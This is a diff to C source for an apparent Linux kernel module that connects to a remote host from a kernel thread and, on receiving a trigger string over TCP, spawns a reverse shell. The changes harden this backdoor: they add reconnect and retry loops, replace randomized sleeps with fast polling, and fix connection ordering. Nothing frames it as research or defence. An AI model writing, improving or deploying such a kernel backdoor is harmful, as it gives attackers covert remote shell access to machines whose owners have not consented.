@@ -74,11 +74,10 @@ static int tls_setup_socket(struct socket *sock, const unsigned char *key,
   // todo
   //
   //
-  return 0
+  return 0;
 }
 
 int thread_task(void *data) {
-  DECLARE_WAIT_QUEUE_HEAD(wq);
   struct socket *sock = (struct socket *)data;
   char *buff = kmalloc(BUF_SIZE, GFP_KERNEL);
   if (buff == NULL) {
@@ -87,11 +86,29 @@ int thread_task(void *data) {
   }
   int ret;
   while (!kthread_should_stop()) {
-    ret = tcp_recv(sock, buff, BUF_SIZE);
+    memset(buff, 0, BUF_SIZE);
+    ret = tcp_recv(sock, buff, BUF_SIZE - 1);
+    if (ret >= BUF_SIZE - 1)
+      buff[BUF_SIZE - 1] = '\0';
+    else
+      buff[ret] = '\0';
+
     if (ret < 0) {
-      printk(KERN_INFO "tcp_recv failed\n");
-      break;
+      printk(KERN_INFO "tcp_recv returned error: %d — sleeping and retrying\n",
+             ret);
+      msleep(2000);
+      continue;
     }
+
+    if (ret == 0) {
+      printk(KERN_INFO "thread_task: tcp_recv returned 0 (peer closed). "
+                       "Waiting for reconnect.\n");
+      msleep(2000);
+      continue;
+    }
+
+    buff[ret] = '\0';
+
     if (strncmp(buff, TRIGGER, strlen(TRIGGER)) == 0) {
       printk(KERN_INFO "Trigger received, creating reverse shell..");
       char *envp[] = {REV_SHELL_ENVP, NULL};
@@ -103,12 +120,9 @@ int thread_task(void *data) {
       }
     }
 
-    {
-      u32 rand_secs = 300 + get_random_u32_below(601);
-      schedule_timeout_interruptible(rand_secs * HZ);
-    }
+    msleep(500);
 
-    wait_event_interruptible(wq, thread != NULL || signal_pending(current));
+    // wait_event_interruptible(wq, thread != NULL || signal_pending(current));
   }
   kfree(buff);
   return 0;
@@ -133,36 +147,46 @@ int socket_init(struct socket **sock_ptr, struct task_struct **thread_ptr) {
   saddr.sin_port = htons(PORT);
   saddr.sin_addr.s_addr = htonl(addr);
 
-  *thread_ptr = kthread_create(thread_task, sock, "tcp_recv_thread");
-  if (IS_ERR(*thread_ptr)) {
-    printk(KERN_INFO "Cannot create tcp_recv thread\n");
-    sock->ops->shutdown(sock, SHUT_RDWR);
-    sock_release(sock);
-    return PTR_ERR(*thread_ptr);
-  }
-  printk(KERN_INFO "Successfully created tcp_recv thread\n");
-
   for (retry_count = 0; retry_count < MAX_RETRIES; retry_count++) {
     err = sock->ops->connect(sock, (struct sockaddr *)&saddr, sizeof(saddr),
                              O_RDWR);
-    if (!err) {
-      printk(KERN_INFO "Socket connected successfully\n");
-      if (err < 0) {
-        printk(KERN_ERR "Failed to set TLS ULP: %d\n", err);
-        sock->ops->shutdown(sock, SHUT_RDWR);
-        sock_release(sock);
-        return err;
-      }
-      wake_up_process(*thread_ptr);
+
+    if (err == 0) {
+      printk(KERN_INFO "socket_init: connected to %pI4:%u\n",
+             &saddr.sin_addr.s_addr, ntohs(saddr.sin_port));
       break;
     }
-    printk(KERN_INFO "Connect failed (retry %d/%d): %d\n", retry_count + 1,
-           MAX_RETRIES, err);
+    printk(KERN_INFO "socket_init: connect failed (try %d/%d): %d\n",
+           retry_count + 1, MAX_RETRIES, err);
     msleep(RETRY_DELAY_MS);
   }
 
-  if (err || sock->sk->sk_state != TCP_ESTABLISHED) {
-    printk(KERN_INFO "Failed to connect after %d retries\n", MAX_RETRIES);
+  if (err != 0) {
+    printk(KERN_INFO "socket_init: failed to connect after %d retries: %d\n",
+           MAX_RETRIES, err);
+    sock_release(sock);
+    *sock_ptr = NULL;
+    *thread_ptr = NULL;
+    return -ECONNREFUSED;
+  }
+
+  *thread_ptr = kthread_create(thread_task, sock, "tcp_recv_thread");
+  if (IS_ERR(*thread_ptr)) {
+    err = PTR_ERR(*thread_ptr);
+    printk(KERN_INFO "socket_init: kthread_create failed: %d\n", err);
+    sock->ops->shutdown(sock, SHUT_RDWR);
+    sock_release(sock);
+    *sock_ptr = NULL;
+    *thread_ptr = NULL;
+    return err;
+  }
+
+  wake_up_process(*thread_ptr);
+
+  if (!sock->sk || sock->sk->sk_state != TCP_ESTABLISHED) {
+    printk(KERN_INFO
+           "socket_init: socket not in ESTABLISHED state after connect\n");
+    kthread_stop(*thread_ptr);
     sock->ops->shutdown(sock, SHUT_RDWR);
     sock_release(sock);
     *sock_ptr = NULL;
